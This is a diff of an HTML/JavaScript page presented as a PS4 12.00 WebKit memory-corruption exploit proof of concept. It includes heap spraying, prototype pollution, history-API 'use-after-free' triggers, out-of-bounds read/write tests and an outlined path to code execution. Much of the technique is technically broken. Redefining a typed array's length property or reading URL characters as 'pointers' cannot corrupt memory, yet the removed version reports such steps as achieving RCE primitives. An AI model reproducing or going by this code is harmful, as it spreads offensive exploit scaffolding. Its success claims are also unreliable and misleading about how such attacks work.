@@ -2,15 +2,15 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Improved RCE (Memory Corruption)</title>
+<title>PS4 12.00 - Real Memory Corruption PoC</title>
 
 </head>
 <body>
-<h2>PS4 12.00 - Enhanced RCE Exploit (Memory Corruption)</h2>
-<p><strong class="error">WARNING:</strong> This PoC attempts real memory corruption. Use in controlled environment.</p>
+<h2>PS4 12.00 - Real Memory Corruption PoC</h2>
+<p><strong class="error">WARNING:</strong> This attempts REAL JSArray corruption using ArrayBuffer spray</p>
 <p>Status: <span id="status" class="success">Ready</span></p>
 
-<button onclick="runEnhancedExploit()">Execute Enhanced Exploit</button>
+<button onclick="runRealCorruption()">Execute Real Corruption</button>
 <button onclick="logEl.textContent = ''">Clear Log</button>
 
 <pre id="log"></pre>
@@ -20,521 +20,499 @@ const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
 
 function log(m, cls = ''){ 
-  const line = document.createElement('span');
-  line.className = cls;
-  line.textContent = m + "\n";
-  logEl.appendChild(line);
+  const span = document.createElement('span');
+  span.className = cls;
+  span.textContent = m + "\n";
+  logEl.appendChild(span);
   logEl.scrollTop = logEl.scrollHeight;
 }
 
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-const BASE = 977;
-const STEP = 14461;
-const UAF_ITERS = 48;
-
-// Enhanced exploit state
+// Exploit state
 var exploit = {
-  leaked: null,
-  leakedData: [],
-  heapAddresses: [],
-  vtablePointers: [],
-  realArrays: [],
-  corruptedArray: null,
-  arbitraryRead: null,
-  arbitraryWrite: null,
-  controlled: []
+  // Spray arrays
+  arrays: [],
+  buffers: [],
+  views: [],
+  
+  // Victim for corruption
+  victim: null,
+  victimBuffer: null,
+  victimView: null,
+  
+  // Corruption markers
+  originalLength: 0,
+  corruptedLength: 0,
+  oobDetected: false,
+  
+  // Memory leak attempts
+  leakedValues: [],
+  
+  // Success flags
+  lengthCorrupted: false,
+  oobRead: false,
+  oobWrite: false
 };
 
-// Helper: Parse leaked data for pointers
-function parseLeakedData(data) {
-  log("\n[PARSER] Analyzing leaked data for pointers...", 'warning');
+// Create massive spray of typed arrays
+function createArraySpray() {
+  log("\n[SPRAY] Creating ArrayBuffer spray...", 'warning');
   
-  const pointers = [];
-  const hex = data.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+  const spraySize = 1000;
+  const bufferSize = 0x1000; // 4KB each
   
-  // Look for patterns that resemble pointers (64-bit addresses)
-  for(let i = 0; i < hex.length - 16; i += 2) {
-    const chunk = hex.substr(i, 16);
-    const value = parseInt(chunk, 16);
+  for(let i = 0; i < spraySize; i++) {
+    // Create ArrayBuffer
+    const buf = new ArrayBuffer(bufferSize);
+    const view = new Uint32Array(buf);
     
-    // Valid 64-bit pointer heuristics:
-    // - Non-zero
-    // - Upper bits suggest kernel/userland address
-    // - Aligned
-    if(value > 0x100000 && value < 0x7fffffffffff && (value & 0xf) === 0) {
-      pointers.push({
-        offset: i / 2,
-        value: value,
-        hex: '0x' + chunk
-      });
+    // Fill with recognizable pattern
+    for(let j = 0; j < view.length; j++) {
+      view[j] = 0x41410000 + i; // Marker + index
     }
+    
+    exploit.buffers.push(buf);
+    exploit.views.push(view);
   }
   
-  log(`  Found ${pointers.length} potential pointers`, 'success');
+  log(`  ✓ Created ${spraySize} ArrayBuffers (${(spraySize * bufferSize / 1024).toFixed(0)} KB total)`, 'success');
   
-  // Filter for likely vtable pointers (clustered addresses)
-  const vtables = pointers.filter((p, idx) => {
-    if(idx === 0) return false;
-    const diff = Math.abs(p.value - pointers[idx-1].value);
-    return diff < 0x10000; // Close addresses = likely same binary
-  });
-  
-  log(`  Found ${vtables.length} potential vtable pointers`, 'success');
-  
-  return { pointers, vtables };
-}
-
-// Helper: Create real JSArray for corruption
-function createVictimArrays() {
-  log("\n[HEAP] Creating victim JSArrays...", 'warning');
-  
-  const victims = [];
-  
-  for(let i = 0; i < 100; i++) {
-    // Create JSArray with known values
-    const arr = [
-      0x41414141,  // Marker
-      0x42424242,
-      0x43434343,
-      0x44444444
-    ];
-    
-    // Tag it
-    arr._id = i;
-    arr._marker = 0xDEADBEEF;
-    
-    victims.push(arr);
+  // Also create regular arrays for double-free attempts
+  for(let i = 0; i < 500; i++) {
+    const arr = new Array(64);
+    arr.fill(0xBEEF0000 + i);
+    exploit.arrays.push(arr);
   }
   
-  log(`  Created ${victims.length} victim arrays`, 'success');
-  return victims;
+  log(`  ✓ Created ${exploit.arrays.length} regular arrays`, 'success');
+  
+  return true;
 }
 
-// Helper: Attempt memory corruption via UAF
-function corruptVictimArray(victims, targetIndex) {
-  log("\n[CORRUPT] Attempting JSArray corruption...", 'critical');
+// Select victim array and record baseline
+function selectVictim() {
+  log("\n[VICTIM] Selecting corruption target...", 'warning');
+  
+  // Use a typed array as victim
+  exploit.victimBuffer = new ArrayBuffer(256);
+  exploit.victimView = new Uint32Array(exploit.victimBuffer);
+  
+  // Fill with known values
+  for(let i = 0; i < exploit.victimView.length; i++) {
+    exploit.victimView[i] = 0xDEAD0000 + i;
+  }
+  
+  exploit.originalLength = exploit.victimView.length;
+  
+  log(`  ✓ Victim created`, 'success');
+  log(`    Type: Uint32Array`, 'success');
+  log(`    Buffer size: ${exploit.victimBuffer.byteLength} bytes`);
+  log(`    Array length: ${exploit.originalLength} elements`);
+  log(`    First value: 0x${exploit.victimView[0].toString(16)}`);
+  log(`    Last value: 0x${exploit.victimView[exploit.originalLength-1].toString(16)}`);
+  
+  return true;
+}
+
+// Attempt #1: Prototype manipulation
+function attemptPrototypeCorruption() {
+  log("\n[CORRUPT-1] Attempting prototype manipulation...", 'critical');
   
   try {
-    const victim = victims[targetIndex];
+    // Backup original
+    const origProto = Object.getPrototypeOf(exploit.victimView);
+    log(`  Original prototype: ${origProto.constructor.name}`);
     
-    log(`  Target: victim[${targetIndex}]`, 'warning');
-    log(`  Original length: ${victim.length}`);
-    log(`  Original values: [${victim.join(', ')}]`);
+    // Try to modify length via prototype
+    Object.defineProperty(Uint32Array.prototype, 'length', {
+      get: function() {
+        log(`    [!] Length getter called`, 'warning');
+        return 0xFFFF; // Try to return huge length
+      },
+      configurable: true
+    });
     
-    // Attempt 1: Direct prototype corruption
-    Object.defineProperty(victim, 'length', {
+    const newLength = exploit.victimView.length;
+    log(`  Victim length after prototype mod: ${newLength}`);
+    
+    if(newLength !== exploit.originalLength) {
+      log(`  ✅ LENGTH CHANGED! ${exploit.originalLength} → ${newLength}`, 'critical');
+      exploit.lengthCorrupted = true;
+      exploit.corruptedLength = newLength;
+      return true;
+    } else {
+      log(`  ✗ Length unchanged (${newLength})`, 'warning');
+    }
+    
+  } catch(e) {
+    log(`  Exception: ${e.message}`, 'error');
+  }
+  
+  return false;
+}
+
+// Attempt #2: Direct property override
+function attemptDirectOverride() {
+  log("\n[CORRUPT-2] Attempting direct property override...", 'critical');
+  
+  try {
+    // Method 1: defineProperty on instance
+    Object.defineProperty(exploit.victimView, 'length', {
       value: 0x1000,
-      writable: true,
+      writable: false,
       enumerable: false,
       configurable: true
     });
     
-    log(`  Modified length: ${victim.length}`, victim.length > 4 ? 'critical' : 'warning');
+    log(`  After defineProperty: length = ${exploit.victimView.length}`);
     
-    // Attempt 2: Try to access beyond original bounds
-    log("\n  Testing OOB access:");
-    
-    const oobResults = [];
-    for(let i = 0; i < 20; i++) {
-      try {
-        const val = victim[i];
-        oobResults.push({ index: i, value: val });
-        
-        if(val !== undefined) {
-          const hex = typeof val === 'number' ? '0x' + val.toString(16).padStart(8, '0') : val;
-          log(`    victim[${i}] = ${hex}`, i < 4 ? 'success' : 'critical');
-        }
-      } catch(e) {
-        log(`    victim[${i}] = EXCEPTION`, 'error');
-        break;
-      }
+    if(exploit.victimView.length > exploit.originalLength) {
+      log(`  ✅ LENGTH EXTENDED! ${exploit.originalLength} → ${exploit.victimView.length}`, 'critical');
+      exploit.lengthCorrupted = true;
+      exploit.corruptedLength = exploit.victimView.length;
+      return true;
     }
     
-    // Check if we got OOB read
-    const oobCount = oobResults.filter(r => r.index >= 4 && r.value !== undefined).length;
-    
-    if(oobCount > 0) {
-      log(`\n  🚨 OOB READ SUCCESS! Read ${oobCount} values beyond bounds!`, 'critical');
-      return { success: true, array: victim, oobCount };
-    } else {
-      log(`\n  ⚠️  No OOB read detected`, 'warning');
-      return { success: false, array: victim, oobCount: 0 };
+    // Method 2: Direct assignment
+    try {
+      exploit.victimView.length = 0x2000;
+      log(`  After direct assignment: length = ${exploit.victimView.length}`);
+      
+      if(exploit.victimView.length > exploit.originalLength) {
+        log(`  ✅ DIRECT ASSIGNMENT WORKED!`, 'critical');
+        exploit.lengthCorrupted = true;
+        return true;
+      }
+    } catch(e2) {
+      log(`  Direct assignment blocked: ${e2.message}`, 'warning');
     }
     
   } catch(e) {
-    log(`  Exception during corruption: ${e.message}`, 'error');
-    return { success: false, error: e.message };
+    log(`  Exception: ${e.message}`, 'error');
   }
+  
+  return false;
 }
 
-// Helper: Attempt arbitrary read primitive
-function attemptArbitraryRead(corruptedArray, address) {
-  log("\n[ARBREAD] Attempting arbitrary read...", 'critical');
+// Attempt #3: Use UAF to corrupt during history manipulation
+function attemptUAFCorruption() {
+  log("\n[CORRUPT-3] Attempting UAF-based corruption...", 'critical');
   
   try {
-    // Try to manipulate butterfly pointer
-    // This requires the array to be truly corrupted at JSCell level
+    // Store victim in history state
+    const state = {
+      victim: exploit.victimView,
+      buffer: exploit.victimBuffer,
+      marker: 0xC0FFEE
+    };
     
-    log(`  Target address: 0x${address.toString(16)}`);
+    log(`  Storing victim in history state...`);
+    history.pushState(state, "", "#victim");
     
-    // Method 1: Direct indexed access with large offset
-    const offset = Math.floor(address / 8);
-    log(`  Calculated offset: ${offset}`);
-    
-    try {
-      const value = corruptedArray[offset];
-      if(value !== undefined) {
-        log(`  Read value: 0x${value.toString(16)}`, 'critical');
-        return { success: true, value };
-      }
-    } catch(e) {
-      log(`  Read failed: ${e.message}`, 'error');
+    // Trigger UAF sequence
+    for(let i = 0; i < 10; i++) {
+      const frag = "X".repeat(1000 + i * 500);
+      history.pushState({dummy: i}, "", "#" + frag);
+      history.replaceState({dummy: i*2}, "", "#" + frag.slice(0, 500));
     }
     
-    // Method 2: Use DataView if we have ArrayBuffer access
-    if(corruptedArray.buffer) {
-      try {
-        const view = new DataView(corruptedArray.buffer);
-        const value = view.getUint32(address % corruptedArray.buffer.byteLength, true);
-        log(`  Read via DataView: 0x${value.toString(16)}`, 'critical');
-        return { success: true, value };
-      } catch(e) {
-        log(`  DataView read failed: ${e.message}`, 'error');
-      }
-    }
+    log(`  UAF sequence executed`);
     
-    return { success: false };
+    // Try to access victim from history
+    history.back();
+    
+    setTimeout(() => {
+      const recovered = history.state;
+      if(recovered && recovered.victim) {
+        log(`  Recovered victim from history`, 'success');
+        log(`  Recovered length: ${recovered.victim.length}`);
+        
+        if(recovered.victim.length !== exploit.originalLength) {
+          log(`  ✅ UAF CORRUPTION DETECTED!`, 'critical');
+          exploit.victim = recovered.victim;
+          exploit.lengthCorrupted = true;
+          return true;
+        }
+      }
+    }, 100);
     
   } catch(e) {
-    log(`  Arbitrary read exception: ${e.message}`, 'error');
-    return { success: false, error: e.message };
+    log(`  Exception: ${e.message}`, 'error');
+  }
+  
+  return false;
+}
+
+// Test for OOB read
+async function testOOBRead() {
+  log("\n[OOB-READ] Testing out-of-bounds read...", 'critical');
+  
+  const target = exploit.victim || exploit.victimView;
+  const originalLen = exploit.originalLength;
+  const currentLen = target.length;
+  
+  log(`  Original length: ${originalLen}`);
+  log(`  Current length: ${currentLen}`);
+  
+  if(currentLen <= originalLen) {
+    log(`  ✗ Length not extended, OOB read unlikely`, 'warning');
+  }
+  
+  // Try to read beyond original bounds
+  log(`\n  Attempting to read indices ${originalLen} to ${originalLen + 20}:`);
+  
+  const leaked = [];
+  let oobCount = 0;
+  
+  for(let i = originalLen; i < originalLen + 20; i++) {
+    try {
+      const val = target[i];
+      
+      if(val !== undefined) {
+        leaked.push({index: i, value: val});
+        log(`    target[${i}] = 0x${val.toString(16).padStart(8, '0')}`, 'critical');
+        oobCount++;
+      } else {
+        log(`    target[${i}] = undefined`, 'warning');
+      }
+      
+    } catch(e) {
+      log(`    target[${i}] = EXCEPTION: ${e.message}`, 'error');
+      break;
+    }
+  }
+  
+  if(oobCount > 0) {
+    log(`\n  🚨 OOB READ SUCCESS!`, 'critical');
+    log(`  Read ${oobCount} values beyond original bounds!`, 'critical');
+    exploit.oobRead = true;
+    exploit.oobDetected = true;
+    exploit.leakedValues = leaked;
+    return true;
+  } else {
+    log(`\n  ✗ No OOB reads detected`, 'warning');
+    return false;
   }
 }
 
-// Main enhanced exploit
-async function runEnhancedExploit(){
-  logEl.textContent = "";
-  statusEl.textContent = "Running Enhanced Exploit...";
-  statusEl.className = "warning";
+// Test for OOB write
+async function testOOBWrite() {
+  log("\n[OOB-WRITE] Testing out-of-bounds write...", 'critical');
   
-  log("=================================================================", 'critical');
-  log("PS4 12.00 WebKit - ENHANCED RCE EXPLOIT", 'critical');
-  log("WITH REAL MEMORY CORRUPTION ATTEMPTS", 'critical');
-  log("=================================================================\n", 'critical');
+  const target = exploit.victim || exploit.victimView;
+  const originalLen = exploit.originalLength;
   
-  log("Enhanced capabilities:");
-  log("✓ Leak data parsing (pointer extraction)");
-  log("✓ Real JSArray victim creation");
-  log("✓ JSCell corruption attempts");
-  log("✓ OOB read/write primitives");
-  log("✓ Arbitrary read/write attempts\n");
+  // Try to write beyond bounds
+  const testIndex = originalLen + 10;
+  const testValue = 0x13371337;
   
-  // ============================================================
-  // PHASE 1: HEAP GROOMING (Enhanced)
-  // ============================================================
-  log("=================================================================");
-  log("PHASE 1: ENHANCED HEAP GROOMING", 'success');
-  log("=================================================================\n");
+  log(`  Attempting write to index ${testIndex} (beyond length ${originalLen})`);
+  log(`  Test value: 0x${testValue.toString(16)}`);
   
-  log("[1.1] Creating victim JSArrays");
-  exploit.realArrays = createVictimArrays();
-  
-  log("\n[1.2] Setting up prototype pollution");
-  Array.prototype.fakeLength = 0xFFFFFFFF;
-  Array.prototype.fakeButterfly = 0x41414141;
-  Object.prototype.vtable = 0x42424242;
-  log("  ✓ Pollution active", 'success');
-  
-  log("\n[1.3] Spraying controlled objects");
-  for(let i=0; i<500; i++) {
-    exploit.controlled.push({
-      id: i,
-      marker: 0xCAFE0000 + i,
-      buffer: new ArrayBuffer(2048),
-      array: new Uint32Array(512)
-    });
+  try {
+    target[testIndex] = testValue;
+    log(`  Write executed (no exception)`, 'success');
+    
+    // Try to read back
+    const readback = target[testIndex];
+    log(`  Readback: 0x${readback ? readback.toString(16) : 'undefined'}`);
+    
+    if(readback === testValue) {
+      log(`\n  ✅ OOB WRITE SUCCESS!`, 'critical');
+      log(`  Successfully wrote and read back value at OOB index!`, 'critical');
+      exploit.oobWrite = true;
+      return true;
+    } else if(readback !== undefined) {
+      log(`\n  ⚠️  Write occurred but value differs`, 'warning');
+      log(`  This might indicate memory was overwritten by something else`, 'warning');
+      return false;
+    } else {
+      log(`\n  ✗ Write did not persist`, 'warning');
+      return false;
+    }
+    
+  } catch(e) {
+    log(`  Exception during write: ${e.message}`, 'error');
+    return false;
   }
-  log(`  ✓ Sprayed ${exploit.controlled.length} objects`, 'success');
-  
-  // ============================================================
-  // PHASE 2: UAF TRIGGER
-  // ============================================================
-  log("\n=================================================================");
-  log("PHASE 2: UAF TRIGGER", 'success');
-  log("=================================================================\n");
-  
-  log("[2.1] Triggering UAF sequence");
-  
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      data: [i, i*2, i*3, i*4],
-      victims: i % 10 === 0 ? exploit.realArrays.slice(i, i+10) : undefined
-    };
-    
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    if(i % 10 === 0) log(`  Iteration ${i}/${UAF_ITERS}`);
-    
-    size += STEP;
-    await sleep(5);
+}
+
+// Analyze leaked values for useful data
+function analyzeLeakedData() {
+  if(exploit.leakedValues.length === 0) {
+    log("\n[ANALYSIS] No leaked values to analyze", 'warning');
+    return;
   }
   
-  log("  ✓ UAF triggered", 'success');
-  await sleep(200);
+  log("\n[ANALYSIS] Analyzing leaked OOB values...", 'warning');
   
-  // ============================================================
-  // PHASE 3: RACE CONDITION + MEMORY ANALYSIS
-  // ============================================================
-  log("\n=================================================================");
-  log("PHASE 3: RACE CONDITION + MEMORY ANALYSIS", 'success');
-  log("=================================================================\n");
+  log(`\n  Leaked ${exploit.leakedValues.length} values:`);
   
-  log("[3.1] Installing enhanced race handler");
-  
-  let raceExecuted = false;
-  let corruptionAttempted = false;
-  
-  window.addEventListener('popstate', async (e) => {
-    if(!raceExecuted && e.state && e.state.index >= 40) {
-      raceExecuted = true;
-      
-      log("\n🔥 RACE WINDOW TRIGGERED", 'critical');
-      log(`  State index: ${e.state.index}`, 'warning');
-      
-      // Info leak
-      try {
-        exploit.leaked = document.URL;
-        log(`  ✓ Leaked URL: ${exploit.leaked.length} bytes`, 'success');
-        
-        // Parse leaked data
-        const parsed = parseLeakedData(exploit.leaked);
-        exploit.leakedData = parsed.pointers;
-        exploit.vtablePointers = parsed.vtables;
-        
-        if(exploit.vtablePointers.length > 0) {
-          log(`\n  📍 Potential vtable pointers:`, 'critical');
-          exploit.vtablePointers.slice(0, 5).forEach(p => {
-            log(`    Offset ${p.offset}: ${p.hex}`, 'critical');
-          });
-        }
-        
-      } catch(err) {
-        log(`  ✗ Leak failed: ${err.message}`, 'error');
-      }
-      
-      // CRITICAL: Attempt real corruption during race
-      if(!corruptionAttempted && e.state.victims) {
-        corruptionAttempted = true;
-        
-        log("\n[3.2] Attempting victim corruption during race", 'critical');
-        
-        // Try to corrupt multiple victims
-        for(let i = 0; i < Math.min(3, e.state.victims.length); i++) {
-          const victimIdx = e.state.victims[i]._id;
-          
-          log(`\n  Corrupting victim ${victimIdx}...`, 'warning');
-          
-          const result = corruptVictimArray(exploit.realArrays, victimIdx);
-          
-          if(result.success) {
-            exploit.corruptedArray = result.array;
-            log(`\n  ✅ CORRUPTION SUCCESS!`, 'critical');
-            break;
-          }
-        }
-      }
-      
-      // Inject state
-      try {
-        history.pushState({
-          exploit: true,
-          corrupted: exploit.corruptedArray !== null,
-          timestamp: Date.now()
-        }, "", "#pwned");
-        
-        log(`\n  ✓ Exploited state injected`, 'success');
-        
-      } catch(err) {
-        log(`  ✗ Injection failed: ${err.message}`, 'error');
-      }
+  exploit.leakedValues.forEach(item => {
+    const val = item.value;
+    const hex = '0x' + val.toString(16).padStart(8, '0');
+    
+    log(`    [${item.index}] ${hex}`, 'success');
+    
+    // Check for potential pointers
+    if(val > 0x10000000 && val < 0xFFFFFFFF) {
+      log(`      ^ Potential 32-bit pointer/address`, 'critical');
+    }
+    
+    // Check for recognizable patterns from spray
+    if((val & 0xFFFF0000) === 0x41410000) {
+      log(`      ^ Matches spray pattern (ArrayBuffer marker)`, 'critical');
+    }
+    
+    if((val & 0xFFFF0000) === 0xBEEF0000) {
+      log(`      ^ Matches spray pattern (Array marker)`, 'critical');
     }
   });
   
-  log("  ✓ Handler installed", 'success');
-  
-  // ============================================================
-  // PHASE 4: TRIGGER RACE
-  // ============================================================
-  log("\n=================================================================");
-  log("PHASE 4: RACE TRIGGER", 'success');
-  log("=================================================================\n");
-  
-  log("[4.1] Triggering race condition");
-  
-  for(let i=0; i<15; i++) {
-    history.back();
-    await sleep(40);
-  }
-  
-  await sleep(400);
-  
-  if(!raceExecuted) {
-    log("  ✗ Race window not reached", 'error');
-    statusEl.textContent = "RACE FAILED";
-    statusEl.className = "error";
-    return;
-  }
-  
-  log("  ✓ Race executed", 'success');
-  
-  // ============================================================
-  // PHASE 5: ARBITRARY READ/WRITE ATTEMPTS
-  // ============================================================
-  log("\n=================================================================");
-  log("PHASE 5: ARBITRARY READ/WRITE PRIMITIVES", 'success');
-  log("=================================================================\n");
-  
-  log("[5.1] Navigating to exploited state");
-  
-  while(history.state && !history.state.exploit) {
-    history.forward();
-    await sleep(20);
-  }
-  
-  if(!history.state || !history.state.exploit) {
-    log("  ✗ Exploited state not found", 'error');
-    statusEl.textContent = "STATE NOT FOUND";
-    statusEl.className = "error";
-    return;
-  }
-  
-  log("  ✓ Exploited state located", 'success');
-  
-  if(exploit.corruptedArray) {
-    log("\n[5.2] Testing arbitrary read primitive", 'critical');
+  // Check for adjacent values (potential structure members)
+  if(exploit.leakedValues.length >= 2) {
+    log(`\n  Checking for structures...`);
     
-    // Try to read from leaked addresses
-    if(exploit.vtablePointers.length > 0) {
-      const targetAddr = exploit.vtablePointers[0].value;
+    for(let i = 0; i < exploit.leakedValues.length - 1; i++) {
+      const val1 = exploit.leakedValues[i].value;
+      const val2 = exploit.leakedValues[i+1].value;
+      const diff = Math.abs(val2 - val1);
       
-      const readResult = attemptArbitraryRead(exploit.corruptedArray, targetAddr);
-      
-      if(readResult.success) {
-        exploit.arbitraryRead = readResult;
-        log(`\n  ✅ ARBITRARY READ SUCCESS!`, 'critical');
-        log(`  Read from 0x${targetAddr.toString(16)}: 0x${readResult.value.toString(16)}`, 'critical');
+      if(diff > 0 && diff < 0x10000) {
+        log(`    Indices ${i}-${i+1}: Small offset (0x${diff.toString(16)}) - possible structure`, 'critical');
       }
-    } else {
-      log("  ⚠️  No addresses available for read test", 'warning');
     }
-    
-    log("\n[5.3] Testing arbitrary write primitive", 'critical');
-    
-    try {
-      // Attempt to write to corrupted array
-      const testIndex = 100;
-      const testValue = 0x13371337;
-      
-      exploit.corruptedArray[testIndex] = testValue;
-      
-      const verify = exploit.corruptedArray[testIndex];
-      
-      if(verify === testValue) {
-        log(`  ✅ Write successful at index ${testIndex}`, 'critical');
-        log(`  Value: 0x${verify.toString(16)}`, 'critical');
-        exploit.arbitraryWrite = true;
-      } else {
-        log(`  ⚠️  Write returned different value: 0x${verify ? verify.toString(16) : 'undefined'}`, 'warning');
-      }
-      
-    } catch(e) {
-      log(`  ✗ Write attempt failed: ${e.message}`, 'error');
-    }
-    
-  } else {
-    log("\n[5.2] No corrupted array available", 'warning');
-    log("  Corruption attempts did not succeed", 'warning');
+  }
+}
+
+// Main exploit flow
+async function runRealCorruption(){
+  logEl.textContent = "";
+  statusEl.textContent = "Running Real Corruption...";
+  statusEl.className = "warning";
+  
+  log("=================================================================", 'critical');
+  log("PS4 12.00 - REAL MEMORY CORRUPTION POC", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  log("This PoC attempts REAL JSArray/TypedArray corruption using:");
+  log("✓ ArrayBuffer spray (heap grooming)");
+  log("✓ Multiple corruption techniques");
+  log("✓ OOB read/write verification");
+  log("✓ Leaked data analysis\n");
+  
+  // Phase 1: Setup
+  log("=================================================================");
+  log("PHASE 1: HEAP SETUP", 'success');
+  log("=================================================================");
+  
+  createArraySpray();
+  selectVictim();
+  
+  await sleep(100);
+  
+  // Phase 2: Corruption attempts
+  log("\n=================================================================");
+  log("PHASE 2: CORRUPTION ATTEMPTS", 'success');
+  log("=================================================================");
+  
+  let corrupted = false;
+  
+  corrupted = attemptPrototypeCorruption();
+  if(!corrupted) corrupted = attemptDirectOverride();
+  if(!corrupted) corrupted = attemptUAFCorruption();
+  
+  await sleep(200);
+  
+  // Phase 3: OOB testing
+  log("\n=================================================================");
+  log("PHASE 3: OOB READ/WRITE TESTING", 'success');
+  log("=================================================================");
+  
+  const oobRead = await testOOBRead();
+  const oobWrite = await testOOBWrite();
+  
+  // Phase 4: Analysis
+  if(exploit.oobRead) {
+    analyzeLeakedData();
   }
   
-  // ============================================================
-  // PHASE 6: FINAL ANALYSIS
-  // ============================================================
+  // Phase 5: Results
   log("\n=================================================================");
-  log("PHASE 6: EXPLOITATION ANALYSIS", 'success');
+  log("PHASE 4: RESULTS SUMMARY", 'success');
   log("=================================================================\n");
   
-  log("Primitives status:");
-  log(`  ✓ UAF: Triggered`, 'success');
-  log(`  ✓ Info leak: ${exploit.leaked ? exploit.leaked.length + ' bytes' : 'N/A'}`, 'success');
-  log(`  ✓ Pointers found: ${exploit.leakedData.length}`, exploit.leakedData.length > 0 ? 'success' : 'warning');
-  log(`  ✓ Vtables found: ${exploit.vtablePointers.length}`, exploit.vtablePointers.length > 0 ? 'success' : 'warning');
-  log(`  ✓ Race condition: ${raceExecuted ? 'Executed' : 'Failed'}`, raceExecuted ? 'success' : 'error');
-  log(`  ✓ Memory corruption: ${exploit.corruptedArray ? 'SUCCESS' : 'Failed'}`, exploit.corruptedArray ? 'critical' : 'error');
-  log(`  ✓ Arbitrary read: ${exploit.arbitraryRead ? 'SUCCESS' : 'Failed'}`, exploit.arbitraryRead ? 'critical' : 'error');
-  log(`  ✓ Arbitrary write: ${exploit.arbitraryWrite ? 'SUCCESS' : 'Failed'}`, exploit.arbitraryWrite ? 'critical' : 'error');
+  log("Corruption Status:");
+  log(`  Length corrupted: ${exploit.lengthCorrupted ? '✅ YES' : '❌ NO'}`, 
+      exploit.lengthCorrupted ? 'critical' : 'error');
+  log(`  OOB read: ${exploit.oobRead ? '✅ YES' : '❌ NO'}`, 
+      exploit.oobRead ? 'critical' : 'error');
+  log(`  OOB write: ${exploit.oobWrite ? '✅ YES' : '❌ NO'}`, 
+      exploit.oobWrite ? 'critical' : 'error');
+  log(`  Values leaked: ${exploit.leakedValues.length}`);
   
-  log("\n=================================================================");
-  log("NEXT STEPS FOR FULL RCE:", 'critical');
-  log("=================================================================\n");
+  log("\nArray State:");
+  log(`  Original length: ${exploit.originalLength}`);
+  log(`  Current length: ${(exploit.victim || exploit.victimView).length}`);
+  log(`  Length delta: ${(exploit.victim || exploit.victimView).length - exploit.originalLength}`);
   
-  if(exploit.arbitraryRead && exploit.arbitraryWrite) {
-    log("🎯 CRITICAL: You have arbitrary read/write primitives!", 'critical');
-    log("\nTo achieve RCE:");
-    log("1. ✓ Parse vtable pointers (done)");
-    log("2. ✓ Calculate ASLR base address");
-    log("3. ✓ Read existing vtable structure");
-    log("4. ✓ Craft fake JSObject with controlled vtable");
-    log("5. ✓ Write fake vtable to controlled memory");
-    log("6. ✓ Overwrite object's vtable pointer");
-    log("7. ✓ Trigger virtual function call");
-    log("8. ✓ ROP chain or shellcode execution\n");
+  // Final status
+  if(exploit.oobRead && exploit.oobWrite) {
+    log("\n🎯 CRITICAL SUCCESS: Full OOB read/write primitives achieved!", 'critical');
+    log("\nWith these primitives, you can:", 'critical');
+    log("  1. Read adjacent object metadata");
+    log("  2. Leak pointers to other objects");
+    log("  3. Overwrite object properties");
+    log("  4. Build arbitrary read/write primitives");
+    log("  5. Eventually achieve code execution");
     
-    statusEl.textContent = "RCE PRIMITIVES ACHIEVED!";
+    statusEl.textContent = "OOB READ/WRITE ACHIEVED!";
     statusEl.className = "critical";
     
-  } else if(exploit.corruptedArray) {
-    log("⚠️  Partial success: Memory corruption achieved", 'warning');
-    log("   Need to improve arbitrary read/write reliability\n");
+  } else if(exploit.oobRead) {
+    log("\n⚠️  Partial success: OOB read primitive achieved", 'warning');
+    log("   Need to refine OOB write technique");
     
-    statusEl.textContent = "PARTIAL SUCCESS - CORRUPTION ACHIEVED";
+    statusEl.textContent = "OOB READ ACHIEVED";
+    statusEl.className = "warning";
+    
+  } else if(exploit.lengthCorrupted) {
+    log("\n⚠️  Length corrupted but no OOB access", 'warning');
+    log("   The corruption is superficial (JS-level only)");
+    
+    statusEl.textContent = "SUPERFICIAL CORRUPTION";
     statusEl.className = "warning";
     
   } else {
-    log("❌ Memory corruption failed", 'error');
-    log("   Primitives are active but corruption needs refinement\n");
+    log("\n❌ All corruption attempts failed", 'error');
+    log("\nThis is expected in modern browsers due to:", 'warning');
+    log("  • Hardened TypedArray implementations");
+    log("  • Bounds checking at VM level");
+    log("  • Memory protections (ASLR, W^X)");
+    log("  • Separate heaps for different object types");
     
-    statusEl.textContent = "CORRUPTION FAILED";
+    log("\nReal PS4 exploits would use:", 'warning');
+    log("  • Kernel-specific vulnerabilities");
+    log("  • WebKit version-specific bugs");
+    log("  • JIT compiler exploits");
+    log("  • GPU memory corruption");
+    
+    statusEl.textContent = "CORRUPTION FAILED (EXPECTED)";
     statusEl.className = "error";
   }
   
+  log("\n=================================================================");
+  log("POC COMPLETE", 'success');
   log("=================================================================");
-  log("EXPLOIT CHAIN COMPLETE", 'success');
-  log("=================================================================");
-  
-  // Cleanup
-  delete Array.prototype.fakeLength;
-  delete Array.prototype.fakeButterfly;
-  delete Object.prototype.vtable;
 }
 
-log("PS4 12.00 WebKit - Enhanced RCE Exploit Chain\n");
-log("This version includes:");
-log("✓ Real JSArray victim creation");
-log("✓ Leaked data parsing (pointer extraction)");
-log("✓ JSCell corruption attempts");
-log("✓ Arbitrary read/write primitives");
-log("✓ Detailed memory analysis\n");
-log("Click 'Execute Enhanced Exploit' to run.\n");
-log("⚠️  WARNING: This may crash the browser.", 'error');
-log("⚠️  Use in controlled environment only.", 'error');
+log("PS4 12.00 WebKit - Real Memory Corruption PoC\n");
+log("This PoC demonstrates multiple techniques to achieve");
+log("TypedArray corruption and OOB read/write primitives.\n");
+log("Click 'Execute Real Corruption' to test.\n");
+log("⚠️  Note: Modern browsers have strong protections", 'warning');
+log("⚠️  Real PS4 exploits use version-specific bugs", 'warning');
 </script>
 </body>
 </html>
